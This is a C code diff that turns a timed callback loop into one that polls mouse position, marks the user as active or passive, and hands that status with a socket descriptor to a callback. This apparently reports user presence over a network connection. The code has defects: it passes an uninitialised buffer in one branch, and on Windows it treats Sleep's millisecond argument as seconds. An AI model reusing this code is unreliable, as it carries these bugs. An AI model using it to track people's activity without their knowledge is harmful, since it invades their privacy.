@@ -1,17 +1,47 @@
 #include "system_api.h"
 
-int callFuncPeriodically(unsigned seconds, int (*func_ptr)()) {
-    time_t start_time = time(NULL);
+int callFuncPeriodically(unsigned seconds, int (*func_ptr)(char *data, int sockfd), int mouse_cords, int sockfd) {
+    int x_prev, y_prev;
+    char *data;
+    char buffer[20];
+    getMousePos(&x_prev, &y_prev);
+
     while (1) {
-        time_t now = time(NULL);
+        if (mouse_cords == 1) {
+            int x, y;
+            getMousePos(&x, &y);
 
-        time_t diff = now - start_time;
+            if(x_prev == x && y_prev == y) {
+                data = "[-] Passive";
+            }
+            else {
+                data = "[+] Active";
+            }
 
-        if (diff  > seconds) {
-            func_ptr();
-            start_time = time(NULL);
+            x_prev = x;
+            y_prev = y;
+
+            //char buffer[20] = {'\0'};
+            //sprintf(buffer, "%d %d", x, y);
+
+            func_ptr(data, sockfd);
         }
+        else {
+            func_ptr(buffer, sockfd);
+        }
+
+        #ifdef __unix__
+
+        sleep(seconds);
+
+        #elif defined(_WIN32) || defined(WIN32) || defined(_WIN64) || defined(WIN64)
+
+        Sleep(seconds);
+
+        #endif
     }
+
+    return 0;
 }
 
 int getMousePos(int *x, int *y) {
